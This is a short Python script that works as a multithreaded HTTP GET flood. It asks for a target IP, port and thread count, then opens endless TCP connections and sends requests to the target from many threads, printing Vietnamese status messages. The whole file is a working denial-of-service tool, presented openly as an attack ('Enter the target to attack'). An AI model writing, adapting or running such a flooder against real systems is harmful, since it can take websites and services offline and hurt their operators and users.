from scapy.all import *;
import random
import sys
import socket as s
import threading

target_ip = input("Enter the target to attack: ")
target_port = int(input("Port: "))
thr = int(input("Threading: "))

def http (target_ip, target_port, i) :
    try:
        while True:
            print("Thread: ", i)
            client=s.socket(s.AF_INET, s.SOCK_STREAM)
            client.connect((target_ip,target_port))
            request="GET / HTTP/1.1\r\nHOST:{}\r\n\r\n".format(target_ip)
            client.send(request.encode())
            print("Da gui HTTP Get toi {}".format(s.gethostbyname(target_ip)))
            client.close()
    except Exception as e:
        print(e)
        sys.exit()



thrList = list()
for i in range (thr) :
    thrHttp = threading.Thread(target = http, args = (target_ip, target_port, i,))
    thrList.append(thrHttp)
    thrHttp.start()